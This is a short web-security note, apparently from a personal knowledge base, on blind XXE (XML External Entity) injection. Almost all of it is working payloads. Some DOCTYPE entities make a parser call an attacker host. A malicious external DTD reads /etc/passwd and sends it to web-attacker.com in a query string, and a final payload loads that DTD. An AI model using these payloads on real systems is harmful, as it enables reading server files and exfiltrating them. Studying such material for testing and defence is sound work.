---
tags:
  - web
  - security
---
A usage of [[XXE SSRF Attack]] to trigger out of bound data exfiltration.
# Lookup ([[XML External Entity|XXE]])
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
```
# Lookup ([[XML Parameter Entity]])
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```
# Content Exfiltration (If Supported)
Malicious DTD on the attacker site `http://web-attacker.com/malicious.dtd`
- Content-Type `application/xml-dtd`
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
XXE payload to vulnerable application:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```